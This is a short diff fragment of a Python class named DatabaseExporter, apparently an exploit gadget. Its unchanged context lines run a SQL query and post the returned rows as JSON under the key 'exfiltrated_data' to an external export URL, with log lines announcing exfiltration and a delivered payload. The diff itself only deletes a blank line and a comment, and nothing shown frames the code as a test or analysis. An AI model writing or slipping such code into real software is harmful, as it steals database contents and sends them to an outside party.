@@ -14,9 +14,7 @@ class DatabaseExporter:
                 print(f"[GADGET] Executing SQL Query: {query}")
                 rows = conn.run(query)
                 conn.close()
-                
                 print(f"[GADGET] Exfiltrating data to: {export_url}")
-                # Send the raw DB rows as JSON
                 requests.post(export_url, json={"exfiltrated_data": rows}, timeout=5)
                 print("[GADGET] Payload delivered successfully!")
             except Exception as e:
